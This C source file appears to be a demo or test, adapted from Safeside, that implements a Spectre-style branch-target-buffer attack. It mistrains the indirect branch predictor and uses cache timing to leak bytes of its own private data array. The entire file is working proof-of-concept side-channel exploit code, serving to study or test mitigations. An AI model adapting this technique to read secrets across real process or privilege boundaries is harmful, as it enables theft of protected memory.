// Based on spectre_v1_btb_sa in Safeside.

#include "trex.h"
#include "demo.h"
#include "timing_array.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#ifdef linux
#include <sys/prctl.h>
#endif

#define ACCESSOR_ARRAY_LENGTH 1024
static int sanity_counter = 0;

char get_byte(size_t index, bool is_private)
{
	// We wouldn't want this to be a branch, but at -O1 it should be fine
	return is_private ? private_data[index + sanity_counter++] : public_data[index];
}

char get_public_byte(size_t index, bool unused __unused)
{
	return public_data[index];
}

struct accessor {
	char (*ptr)(size_t, bool);
};

char leak_byte(size_t offset)
{
	struct timing_array *ta = ta_new();
	char (*ptr_array[ACCESSOR_ARRAY_LENGTH])(size_t, bool);
	// Make sure we can flush the accessor without hitting anything else
	struct accessor *accessor = aligned_alloc(cacheline_size, cacheline_size);

	size_t local_pointer_index, i;
	bool is_private;
	int run, result;

	for (run = 0;; run++) {
		ta_flush(ta);

		// We will mistrain the indirect branch predictor to predict get_byte()
		for (i = 0; i < ACCESSOR_ARRAY_LENGTH; i++) {
			ptr_array[i] = get_byte;
		}

		// The mistrained branch predictor will call get_byte() when it should call
		// get_public_byte(), leading to impossible reads from private_data
		local_pointer_index = run % ACCESSOR_ARRAY_LENGTH;
		ptr_array[local_pointer_index] = get_public_byte;

		for (i = 0; i <= local_pointer_index; i++) {
			accessor->ptr = ptr_array[i];

			is_private = (i == local_pointer_index);

			// Make sure the CPU doesn't know what function it's calling
			flush_cacheline(accessor);

			// Architecturally, this will always read from public_data.
			force_read(
				ta->entries[(size_t)accessor->ptr(offset, is_private)]);
		}

		result = ta_find_first_cached_index_after(ta, public_data[offset]);

		if (result >= 0) {
			free(accessor);
			ta_free(ta);
			return result;
		}

		if (run > 100000) {
			free(accessor);
			ta_free(ta);
			trex_demo_exit(TREX_COULDNT_LEAK);
		}
	}
}

int main(void)
{
	trex_demo_init(false, true);

	for (size_t i = 0; i < SECRET_LEN; i++) {
		print_leak(leak_byte(i), i);
		if (sanity_counter) {
			printf("\nBUG: get_byte(%ld, true) has been architecturally executed.\n",
			       i);
			trex_demo_exit(TREX_ERROR);
		}
	}

	trex_demo_exit(TREX_SUCCESS);
}
